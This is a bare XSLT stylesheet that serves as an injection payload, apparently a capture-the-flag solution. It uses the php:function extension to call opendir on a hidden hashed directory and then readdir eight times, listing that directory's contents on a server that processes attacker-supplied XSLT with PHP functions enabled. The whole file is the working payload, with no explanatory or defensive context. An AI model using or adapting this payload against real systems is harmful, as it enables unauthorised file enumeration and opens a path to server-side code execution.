<?xml version="1.0" encoding="UTF-8"?>
<xsl:stylesheet version="1.0" xmlns:xsl="http://www.w3.org/1999/XSL/Transform" xmlns:php="http://php.net/xsl">
    <xsl:output method="html"/>
    <xsl:template match="/">
      <xsl:value-of select="php:function('opendir','./.6ff3200bee785801f420fba826ffcdee')"/><br/>
      <xsl:value-of select="php:function('readdir')"/><br/>
      <xsl:value-of select="php:function('readdir')"/><br/>
      <xsl:value-of select="php:function('readdir')"/><br/>
      <xsl:value-of select="php:function('readdir')"/><br/>
      <xsl:value-of select="php:function('readdir')"/><br/>
      <xsl:value-of select="php:function('readdir')"/><br/>
      <xsl:value-of select="php:function('readdir')"/><br/>
      <xsl:value-of select="php:function('readdir')"/><br/>
    </xsl:template>
</xsl:stylesheet>
